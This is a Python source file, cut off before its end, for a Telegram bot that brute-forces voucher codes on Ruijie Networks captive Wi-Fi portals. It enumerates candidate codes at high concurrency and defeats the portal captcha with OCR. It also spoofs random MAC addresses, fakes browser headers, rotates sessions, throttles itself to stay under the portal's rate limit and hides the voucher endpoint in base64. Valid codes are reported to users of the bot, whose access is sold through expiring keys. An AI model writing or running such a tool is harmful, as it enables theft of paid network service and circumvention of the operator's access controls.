# ── Imports ───────────────────────────────────────────────────────────────
import asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, signal, logging
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telebot import asyncio_helper
from aiohttp import web
try:
    from aiohttp_socks import ProxyConnector
    _SOCKS_AVAILABLE = True
except ImportError:
    ProxyConnector = None
    _SOCKS_AVAILABLE = False
import cv2, ddddocr, numpy as np
from datetime import datetime, timedelta, timezone

# ── Logging ───────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
log = logging.getLogger("ruijie-bot")

# ── Environment Variables ─────────────────────────────────────────────────
BOT_TOKEN    = os.environ.get('BOT_TOKEN', '')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
ADMIN_ID     = os.environ.get('ADMIN_ID', '')
REPO_OWNER   = os.environ.get('REPO_OWNER', '')
REPO_NAME    = os.environ.get('REPO_NAME', '')
# Optional proxy — http://host:port | socks5://user:pass@host:port
PROXY_URL    = os.environ.get('PROXY_URL', '')

def validate_env():
    missing = [v for v in ["BOT_TOKEN", "GITHUB_TOKEN", "ADMIN_ID", "REPO_OWNER", "REPO_NAME"]
               if not os.environ.get(v)]
    if missing:
        raise SystemExit(f"❌ Missing env vars: {', '.join(missing)}")
    log.info("✅ All environment variables loaded.")

# ── Bot Init + Proxy ──────────────────────────────────────────────────────
bot = AsyncTeleBot(BOT_TOKEN)
if PROXY_URL:
    asyncio_helper.proxy = PROXY_URL
    log.info(f"🔒 Telegram proxy: {PROXY_URL}")

# ── Constants ─────────────────────────────────────────────────────────────
TG_MAX_LEN               = 4000
CONCURRENCY              = 300
BATCH_SIZE               = 500
CAPTCHA_RETRY            = 8        # 2026: captcha auto-trigger ကြောင့် retry တိုး
MAX_ATTEMPTS             = 3        # 2026: session rotation ကြောင့် attempt တိုး
PROGRESS_INTERVAL        = 3        # seconds between progress edits
GITHUB_INTERVAL          = 30       # seconds between GitHub saves
SESSION_RECHECK_INTERVAL = 3600     # ⭐ 1 hour — scan traffic နဲ့ ထပ်တူမပျောက်ဖို့
SESSION_FAIL_THRESHOLD   = 10       # ⭐ 10 consecutive explicit fails (3→10)
RATE_LIMIT_WINDOW        = 60       # 2026: 1 min window
MAX_VOUCHER_PER_MIN      = 25       # 2026: stay under 30/min limit

# ── Global State ──────────────────────────────────────────────────────────
SUCCESS_CODE       = asyncio.Queue()
user_data          = {}       # {chat_id: {"session_url": ..., "portal_type": ...}}
approve            = {}       # {chat_id: bool}
scan_tasks         = {}
success_texts      = {}
limited_texts      = {}
session_fail_count = {}
last_scan_index    = {}
notify_setting     = {}
DEFAULT_NOTIFY     = True
last_scan_params   = {}
pending_brute      = {}
success_messages   = {}
limited_messages   = {}
session            = None
_connector         = None
_voucher_sem       = None     # init in main()
# ⭐ OCR pool — single Lock တစ်ခုနဲ့ serialize မလုပ်တော့ဘဲ pool 6 ခု concurrent သုံးသည်
_OCR_POOL_SIZE     = 6
_ocr_pool          = [ddddocr.DdddOcr(show_ad=False) for _ in range(_OCR_POOL_SIZE)]
_ocr_available     = None     # asyncio.Queue, init in main()
_rate_limiter      = None     # init in main()
_start_time        = time.monotonic()

# ── Portal Configuration (2026 Update) ───────────────────────────────────
PORTAL_CONFIGS = {
    "portal-mm-as": {
        "domain":              "portal-mm-as.ruijienetworks.com",
        "base_url":            "https://portal-mm-as.ruijienetworks.com",
        "voucher_api":         base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtbW0tYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode(),
        "balance_api":         "https://portal-mm-as.ruijienetworks.com/api/auth/balance/getBalance",
        "captcha_image_api":   "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api":  "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index":       "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance":     "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
    },
    "portal-as": {
        "domain":              "portal-as.ruijienetworks.com",
        "base_url":            "https://portal-as.ruijienetworks.com",
        "voucher_api":         base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode(),
        "balance_api":         "https://portal-as.ruijienetworks.com/api/auth/balance/getBalance",
        "captcha_image_api":   "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api":  "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index":       "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance":     "https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
    },
}
DEFAULT_PORTAL = "portal-mm-as"

def get_portal_config(session_url=None):
    if session_url:
        if "portal-mm-as" in session_url:
            return PORTAL_CONFIGS["portal-mm-as"], "portal-mm-as"
        elif "portal-as" in session_url:
            return PORTAL_CONFIGS["portal-as"], "portal-as"
    return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL

# ── Rate Limiter (2026: 30/min Ruijie limit) ──────────────────────────────
class RateLimiter:
    """Ruijie 2026: ၁ မိနစ်အတွင်း ၃၀ ကြိမ် limit ရှိသည်။ ၂၅ ကြိမ်နဲ့ ထိန်းချုပ်သည်။"""
    def __init__(self, max_per_minute=MAX_VOUCHER_PER_MIN):
        self.max_per_minute = max_per_minute
        self.timestamps = []
        self.lock = asyncio.Lock()

    async def acquire(self):
        async with self.lock:
            now = time.monotonic()
            self.timestamps = [t for t in self.timestamps if now - t < RATE_LIMIT_WINDOW]
            if len(self.timestamps) >= self.max_per_minute:
                wait = RATE_LIMIT_WINDOW - (now - self.timestamps[0]) + 0.1
                if wait > 0:
                    log.info(f"[rate-limiter] waiting {wait:.1f}s ({self.max_per_minute}/min limit)")
                    await asyncio.sleep(wait)
                    now = time.monotonic()
                    self.timestamps = [t for t in self.timestamps if now - t < RATE_LIMIT_WINDOW]
            self.timestamps.append(time.monotonic())

# ── Connector Factory (Proxy-Aware) ──────────────────────────────────────
def create_connector():
    """PROXY_URL ရှိပြီး aiohttp-socks ထည့်ထားရင် ProxyConnector, မဟုတ်ရင် TCPConnector"""
    if PROXY_URL:
        if not _SOCKS_AVAILABLE:
            log.warning("⚠️ PROXY_URL set but aiohttp-socks not installed — using direct connection.")
        else:
            try:
                conn = ProxyConnector.from_url(PROXY_URL, limit=1000, rdns=True)
                log.info(f"🔒 Proxy connector: {PROXY_URL}")
                return conn
            except Exception as e:
                log.error(f"❌ Proxy failed ({e}) — direct connection.")
    return aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300)

# ── Key Auth Helpers ──────────────────────────────────────────────────────
def check_key_expiration(data):
    """auth_list.json entry တစ်ခု valid ဆိုမဆိုစစ်သည်"""
    try:
        if isinstance(data, dict):
            expiry = data.get("expires_at", "")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        # legacy "MM-HH-DD-MM-YYYY" format
        mm, hh, dd, MM, yyyy = map(int, str(data).split('-'))
        return datetime.now(timezone.utc) < datetime(
            year=yyyy, month=MM, day=dd, hour=hh, minute=mm, tzinfo=timezone.utc
        )
    except Exception:
        return False

def generate_expiry(plan: str):
    """'1h30m', '7d', 'unlimited' → ISO expiry string"""
    now = datetime.now(timezone.utc)
    if plan.lower() in ("unlimited", "unlimit"):
        return "9999-12-31T23:59:59Z"
    total = 0
    for val, unit in re.findall(r'(\d+)\s*([dhm])\b', plan.lower()):
        val = int(val)
        if unit == 'd':   total += val * 86400
        elif unit == 'h': total += val * 3600
        elif unit == 'm': total += val * 60
    return (now + timedelta(seconds=total)).strftime("%Y-%m-%dT%H:%M:%SZ") if total else None

# ── Telegram Helpers ──────────────────────────────────────────────────────
def _truncate(text, limit=TG_MAX_LEN):
    return text if len(text) <= limit else text[:limit - 20] + "\n…(truncated)"

def _md_escape(s):
    return re.sub(r'([_*`\[\]])', r'\\\1', str(s))

async def _safe_edit(chat_id, message_id, text, parse_mode=None):
    text = _truncate(text)
    try:
        await bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                                    text=text, parse_mode=parse_mode)
        return message_id
    except Exception:
        try:
            sent = await bot.send_message(chat_id, text, parse_mode=parse_mode)
            return sent.message_id
        except Exception as e2:
            log.warning(f"[_safe_edit] {chat_id}: {e2}")
            return message_id

# ── Web Server (Railway) ──────────────────────────────────────────────────
async def handle_root(request):
    uptime = int(time.monotonic() - _start_time)
    h, r = divmod(uptime, 3600)
    m, s = divmod(r, 60)
    return web.Response(text=f"✅ Ruijie Bot running | Uptime: {h}h {m}m {s}s")

async def handle_health(request):
    return web.Response(text="ok", status=200)

async def web_server():
    app = web.Application()
    app.router.add_get('/',       handle_root)
    app.router.add_get('/health', handle_health)
    runner = web.AppRunner(app)
    await runner.setup()
    # Railway sets PORT; fallback to BOT_PORT or 8099
    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8099)))
    await web.TCPSite(runner, '0.0.0.0', port).start()
    log.info(f"✅ Web server on port {port}")

# ── GitHub Helpers ────────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json()
                return json.loads(base64.b64decode(data['content']).decode()), data['sha']
    except Exception as e:
        log.error(f"[github] get {path}: {e}")
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
    payload = {"message": message, "content": base64.b64encode(json.dumps(content).encode()).decode()}
    if sha:
        payload["sha"] = sha
    try:
        async with session.put(url, headers=headers, json=payload) as resp:
            return await resp.text()
    except Exception as e:
        log.error(f"[github] update {path}: {e}")

# ── Time / Size Formatters ─────────────────────────────────────────────────
def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':           total += val * 30 * 24 * 60
        elif unit == 'd':          total += val * 24 * 60
        elif unit == 'h':          total += val * 60
        elif unit in ('min', 'm'): total += val
    return total

def _parse_seconds(val):
    secs  = int(val)
    hours = secs // 3600
    mins  = (secs % 3600) // 60
    if hours > 0:  return f"{hours}h {mins}m"
    elif mins > 0: return f"{mins}m"
    return f"{secs}s"

def _parse_minutes(val):
    m = int(val)
    if m <= 0:   return "0m"
    if m < 60:   return f"{m}m"
    h = m // 60; m %= 60
    if h < 24:   return f"{h}h {m}m" if m else f"{h}h"
    d = h // 24; h %= 24
    if d < 30:   return f"{d}d {h}h" if h else f"{d}d"
    mo = d // 30; d %= 30
    return f"{mo}mo {d}d" if d else f"{mo}mo"

def _format_bytes(v):
    try:
        v = float(v)
        if v >= 1024**3: return f"{v/(1024**3):.2f} GB"
        if v >= 1024**2: return f"{v/(1024**2):.2f} MB"
        if v >= 1024:    return f"{v/1024:.2f} KB"
        return f"{v:.0f} B"
    except Exception:
        return "N/A"

def _format_quota(used, total=None):
    try:
        if isinstance(used, dict):
            up   = used.get('up', used.get('upload', 0))
            down = used.get('down', used.get('download', 0))
            tot  = used.get('total', up + down)
        else:
            tot = used; up = 0; down = 0
        s = _format_bytes(tot)
        if up and down:
            return f"{s} ({_format_bytes(up)}↑/{_format_bytes(down)}↓)"
        return s
    except Exception:
        return "N/A"

def _parse_expire(expire_str):
    if not expire_str or expire_str == "N/A":
        return None
    fmts = [
        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%Y-%m-%d",
        "%Y/%m/%d %H:%M:%S", "%Y/%m/%d %H:%M", "%Y/%m/%d",
        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y %H:%M:%S",
        "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%SZ",
    ]
    for fmt in fmts:
        try:
            return datetime.strptime(str(expire_str).strip(), fmt)
        except Exception:
            continue
    return None

def is_expired(expire_str):
    dt = _parse_expire(expire_str)
    return dt is not None and dt < datetime.now()

# ── Balance Fetcher (2026) ────────────────────────────────────────────────
async def get_balance(token, portal_config):
    url     = f"{portal_config['balance_api']}/{token}"
    headers = {
        'authority':        portal_config['domain'],
        'accept':           'application/json, text/javascript, */*; q=0.01',
        'accept-language':  'en-US,en;q=0.9,my;q=0.8',
        'content-type':     'application/json;',
        'referer':          portal_config['referer_balance'].format(token=token),
        'sec-ch-ua':        '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'user-agent':       'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    empty = {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
    try:
        async with session.get(url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=8)) as resp:
            raw = await resp.text()
            if resp.status != 200:
                alt = f"{portal_config['base_url']}/api/macc2/balance/getBalance/{token}"
                async with session.get(alt, headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=8)) as r2:
                    raw = await r2.text()
                    if r2.status != 200:
                        return empty
        try:
            data = json.loads(raw)
        except Exception:
            return empty

        result = dict(empty)
        candidates = [data]
        for key in ('result', 'data'):
            if isinstance(data, dict) and isinstance(data.get(key), dict):
                candidates.append(data[key])

        for d in candidates:
            if not isinstance(d, dict):
                continue
            for k in ('totalMinutes','remainingMinutes','remainMinutes','leftMinutes','balance','remaining'):
                if d.get(k) is not None:
                    result["time"] = _parse_minutes(d[k]); break
            for k in ('remainingSeconds','remainTime','remainingTime','leftTime','timeLeft','remain_time'):
                if d.get(k) is not None:
                    result["time"] = _parse_seconds(d[k]); break
            usage = d.get('usage') or d.get('dataUsage') or d.get('traffic')
            if usage:
                result["usage"] = _format_quota(usage) if isinstance(usage, dict) else _format_bytes(usage)
            sq = d.get('sessionQuota')
            tq = d.get('totalQuota')
            q  = d.get('quota') or d.get('dataQuota') or d.get('limit')
            if sq and tq:
                result["quota"] = f"{_format_bytes(sq)} / {_format_bytes(tq)}"
            elif q:
                result["quota"] = _format_bytes(q)
            plan = d.get('plan') or d.get('planName') or d.get('internetPlan') or d.get('package')
            if plan:
                result["plan"] = str(plan)
            exp = d.get('expireTime') or d.get('expiration') or d.get('expire') or d.get('validUntil')
            if exp:
                result["expire"] = str(exp)
        return result
    except Exception as e:
        log.error(f"[get_balance] {token}: {e}")
        return empty

# ── OCR / Captcha (⭐ Pool-based: 6 concurrent OCR instead of 1) ───────────
def _ocr_sync(image_bytes, ocr_instance):
    """Thread pool တွင် run သည်။ ocr_instance ကို pool မှ ယူသုံးသည်။"""
    nparr = np.frombuffer(image_bytes, np.uint8)
    img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray  = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', thresh)
    result = ocr_instance.classification(buf.tobytes())
    return result.upper() if result else None

async def Captcha_Text(image_bytes):
    """
    ⭐ asyncio.Queue pool: OCR instance ကို pool မှ checkout → thread run → return to pool
    Lock တစ်ခုနောက် serialize မဟုတ်တော့ဘဲ 6 ခု concurrent run နိုင်သည်။
    """
    ocr = await _ocr_available.get()
    try:
        return await asyncio.to_thread(_ocr_sync, image_bytes, ocr)
    finally:
        _ocr_available.put_nowait(ocr)  # pool ကို ပြန်ထည့်

def get_mac():
    first = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac   = [first] + [random.randint(0, 255) for _ in range(5)]
    return ':'.join(f'{b:02x}' for b in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

# ── Session Helpers ───────────────────────────────────────────────────────
async def get_session_id(sess, session_url, prev=None):
    url     = replace_mac(session_url, get_mac())
    headers = {
        'accept':            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language':   'en-US,en;q=0.9',
        'referer':           url,
        'sec-ch-ua':         '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile':  '?0',
        'sec-ch-ua-platform':'"Android"',
        'sec-fetch-dest':    'document',
        'sec-fetch-mode':    'navigate',
        'upgrade-insecure-requests': '1',
        'user-agent':        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True) as req:
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return m.group(1) if m else prev
    except Exception:
        return prev

async def Captcha_Image(sess, session_id, portal_config):
    headers = {
        'authority':        portal_config['domain'],
        'accept':           'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language':  'en-US,en;q=0.9,my;q=0.8',
        'referer':          portal_config['referer_index'] + session_id,
        'sec-fetch-dest':   'image',
        'sec-fetch-mode':   'no-cors',
        'sec-fetch-site':   'same-origin',
        'user-agent':       'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(portal_config['captcha_image_api'],
                        params={'sessionId': session_id, '_t': str(time.time())},
                        headers=headers) as req:
        return await req.read()

async def Varify_Captcha(sess, session_id, text, portal_config):
    headers = {
        'authority':        portal_config['domain'],
        'accept':           '*/*',
        'accept-language':  'en-US,en;q=0.9,my;q=0.8',
        'content-type':     'application/json',
        'origin':           portal_config['base_url'],
        'referer':          portal_config['referer_index'] + session_id,
        'user-agent':       'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.post(portal_config['captcha_verify_api'],
                         headers=headers,
                         json={'sessionId': session_id, 'authCode': text}) as req:
        data = await req.json()
        return session_id if data.get("success") is True else None

async def check_session_url(session_url):
    """
    ⭐ Lenient: scan ကျပ်နေချိန် throttle responses နဲ့ false expiry မဖြစ်ဖို့
    True  = ဆက်သုံးနိုင်သည်
    False = explicit invalid (portal က ရှင်းလင်းစွာ ငြင်းပယ်)
    None  = uncertain (timeout/server error) → caller က ထပ်မရေတွက်ရ
    """
    headers = {
        'accept':             'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language':    'en-US,en;q=0.9',
        'referer':            session_url,
        'sec-ch-ua':          '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile':   '?0',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'user-agent':         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=12)) as resp:
            url_str = str(resp.url)

            # ⭐ Portal domain ပါရင် / sessionId ရရင် → valid
            if "ruijienetworks.com" in url_str or "sessionId" in url_str:
                return True

            # Server error / rate limited → uncertain (None), failure မဟုတ်
            if resp.status >= 400:
                return None

            try:
                body = (await resp.text(errors='ignore')).lower()
            except Exception:
                return None  # body မဖတ်ရ → uncertain

            # ⭐ 4xx status + very specific keywords မှသာ False
            # portal throttle/503 response တွေ False မဖြစ်ဖို့ status ကိုပါ စစ်ဆေး
            if resp.status in (401, 403):
                if "invalid sessionid" in body or "session not found" in body:
                    return False
                # 401/403 ဖြစ်ပေမယ့် keywords မပါ → uncertain
                return None

            return True  # default → assume valid

    except (asyncio.TimeoutError, aiohttp.ClientError):
        return None
    except Exception:
        return None

# ── Core Voucher Check (2026: Rate-limited + Session Rotation) ────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                        message=None, plan_filters=None):
    if not recheck:
        ct = scan_tasks.get(chat_id)
        if not ct or ct.get("scan_id") != scan_id:
            return

    # 2026: rate limiter — 25/min ထိမ်းသည်
    await _rate_limiter.acquire()

    portal_config, portal_name = get_portal_config(session_url)
    post_url = portal_config['voucher_api']
    response = None
    session_id = None

    for attempt in range(MAX_ATTEMPTS):
        response = None
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=20)
        ) as task_sess:
            # 2026: fresh session ID per attempt
            session_id = await get_session_id(task_sess, session_url)
            if not session_id:
                continue

            auth_code = None
            for _ in range(CAPTCHA_RETRY):
                try:
                    img  = await Captcha_Image(task_sess, session_id, portal_config)
                    text = await Captcha_Text(img)
                    if text and await Varify_Captcha(task_sess, session_id, text, portal_config):
                        auth_code = text
                        break
                except Exception:
                    continue
            if not auth_code:
                continue

            if not recheck:
                ct = scan_tasks.get(chat_id)
                if not ct or ct.get("scan_id") != scan_id or ct.get("stop"):
                    return

            headers = {
                "authority":        portal_config['domain'],
                "accept":           "*/*",
                "accept-language":  "en-US,en;q=0.9",
                "content-type":     "application/json",
                "origin":           portal_config['base_url'],
                "referer":          portal_config['referer_index'] + session_id,
                "sec-ch-ua":        '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "user-agent":       "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_sess.post(
                    post_url,
                    json={"accessCode": code, "sessionId": session_id,
                          "apiVersion": 1, "authCode": auth_code},
                    headers=headers
                ) as req:
                    response = await req.text()
            except Exception as e:
                log.debug(f"[check] network: {e}")
                continue

        if response and 'request limited' in response:
            wait = min(2 ** attempt, 8)
            log.info(f"[check] rate limited, waiting {wait}s (attempt {attempt+1})")
            await asyncio.sleep(wait)
            continue

        if response:
            try:
                json.loads(response)
                break
            except Exception:
                continue

    if not response:
        return

    # ── Success ──────────────────────────────────────────────────────────
    if 'logonUrl' in response:
        if recheck:
            return code

        plan_str = usage_str = quota_str = expire_str = "N/A"
        try:
            res_data  = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "")
            m = re.search(r'token=(.*?)&', logon_url)
            token = m.group(1) if m else session_id
            if not token:
                m2 = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", logon_url)
                token = m2.group(1) if m2 else session_id
            bal = await get_balance(token, portal_config)
            plan_str   = bal.get("time",   "N/A")
            usage_str  = bal.get("usage",  "N/A")
            quota_str  = bal.get("quota",  "N/A")
            expire_str = bal.get("expire", "N/A")
        except Exception as e:
            log.debug(f"[check] balance parse: {e}")

        if plan_filters:
            if not any(plan_to_minutes(plan_str) >= plan_to_minutes(f) for f in plan_filters):
                return None

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({
            "code": code, "session_id": session_id, "plan": plan_str,
            "usage": usage_str, "quota": quota_str,
            "expire": expire_str, "portal": portal_name,
        })
        await SUCCESS_CODE.put({
            "chat_id": chat_id, "code": code, "session_id": session_id,
            "plan": plan_str, "usage": usage_str, "quota": quota_str,
        })

        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            lines = []
            for item in success_texts[chat_id]:
                ln = f"`{_md_escape(item['code'])}` – ⏳ {_md_escape(item['plan'])}"
                if item.get('usage') != 'N/A':
                    ln += f"\n   📊 {_md_escape(item['usage'])}"
                if item.get('quota') != 'N/A':
                    ln += f" | 💾 {_md_escape(item['quota'])}"
                if item.get('portal'):
                    ln += f" | 🌐 {_md_escape(item['portal'])}"
                lines.append(ln)
            full = f"✅ Success Codes:\n" + "\n".join(lines)
            if chat_id not in success_messages:
                try:
                    sent = await bot.send_message(chat_id, _truncate(full), parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                except Exception as e:
                    log.warning(f"[notify] send: {e}")
            else:
                success_messages[chat_id] = await _safe_edit(
                    chat_id, success_messages[chat_id], full, parse_mode="Markdown"
                )
        return code

    # ── Session-limited (STA) ─────────────────────────────────────────────
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            full = f"⚠️ Limited Codes:\n" + "\n".join(limited_texts[chat_id])
            if chat_id not in limited_messages:
                try:
                    sent = await bot.send_message(chat_id, _truncate(full))
                    limited_messages[chat_id] = sent.message_id
                except Exception as e:
                    log.warning(f"[notify] limited: {e}")
            else:
                limited_messages[chat_id] = await _safe_edit(
                    chat_id, limited_messages[chat_id], full
                )

# ── Code Iterator (Resume-friendly) ──────────────────────────────────────
def _get_charset(mode):
    if mode == 1: return string.digits
    if mode == 2: return string.ascii_lowercase
    if mode == 3: return string.ascii_uppercase
    if mode == 4: return string.ascii_letters
    if mode == 5: return string.ascii_lowercase + string.digits
    raise ValueError(f"Invalid mode: {mode}. Use 1-5")

def iter_codes(mode, length, start_index=0):
    chars = _get_charset(mode)
    base  = len(chars)
    total = base ** length
    idx   = start_index
    while idx < total:
        n    = idx
        code = []
        for _ in range(length):
            code.append(chars[n % base])
            n //= base
        yield "".join(code), idx
        idx += 1

def format_progress(checked, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Brute-force Runner ────────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                         target=None, message=None, progress_msg=None,
                         plan_filters=None, start_index=0):
    try:
        code_iter = iter_codes(mode, length, start_index)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    found = checked = 0
    scan_start          = time.monotonic()
    last_progress_upd   = 0
    last_saved_index    = start_index
    last_key_check      = time.monotonic()

    try:
        while True:
            ct = scan_tasks.get(chat_id)
            if not ct or ct.get("scan_id") != scan_id:
                return
            if ct.get("stop"):
                last_scan_params[chat_id] = {
                    "mode": mode, "length": length, "target": target,
                    "plan_filters": plan_filters or [],
                    "start_index": last_saved_index,
                }
                scan_tasks.pop(chat_id, None)
                return

            # ── Key expiration re-check every 10 min during scan ─────────
            if time.monotonic() - last_key_check >= SESSION_RECHECK_INTERVAL:
                auth_list, _ = await get_file_content("auth_list.json")
                if (str(chat_id) not in auth_list
                        or not check_key_expiration(auth_list[str(chat_id)])):
                    approve[chat_id] = False
                    await bot.send_message(chat_id, "⚠️ Key သက်တမ်းကုန်ပါပြီ။ Scan ရပ်ပါမည်။")
                    scan_tasks.pop(chat_id, None)
                    return
                last_key_check = time.monotonic()

            # ── Build batch ───────────────────────────────────────────────
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                await _safe_edit(chat_id, progress_msg.message_id,
                                 f"✅ Search space exhausted.\n"
                                 f"🔍 Checked: {checked:,}\n💎 Found: {found}")
                scan_tasks.pop(chat_id, None)
                last_scan_params.pop(chat_id, None)
                return

            async def _check(code, idx):
                async with _voucher_sem:
                    res = await perform_check(
                        session_url, code, chat_id, scan_id,
                        message=message, plan_filters=plan_filters,
                    )
                    return res, idx

            results = await asyncio.gather(
                *[_check(c, i) for c, i in batch], return_exceptions=True
            )

            for res in results:
                if isinstance(res, Exception):
                    continue
                r, idx = res
                last_saved_index = idx + 1
                if r:
                    found += 1
                    if target and found >= target:
                        await _safe_edit(chat_id, progress_msg.message_id, "🎯 Target reached!")
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)
            elapsed  = time.monotonic() - scan_start
            speed    = (checked / elapsed * 60) if elapsed > 0 else 0

            now = time.monotonic()
            if now - last_progress_upd >= PROGRESS_INTERVAL:
                new_id = await _safe_edit(
                    chat_id, progress_msg.message_id,
                    format_progress(checked, speed, found, target)
                )
                if new_id != progress_msg.message_id:
                    progress_msg.message_id = new_id
                last_progress_upd = now

            last_scan_index[chat_id] = last_saved_index
    finally:
        scan_tasks.pop(chat_id, None)

# ── Schedulers ────────────────────────────────────────────────────────────
async def github_update_scheduler():
    while True:
        await asyncio.sleep(GITHUB_INTERVAL)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if not items:
            continue
        try:
            results, sha = await get_file_content("result.json")
            for item in items:
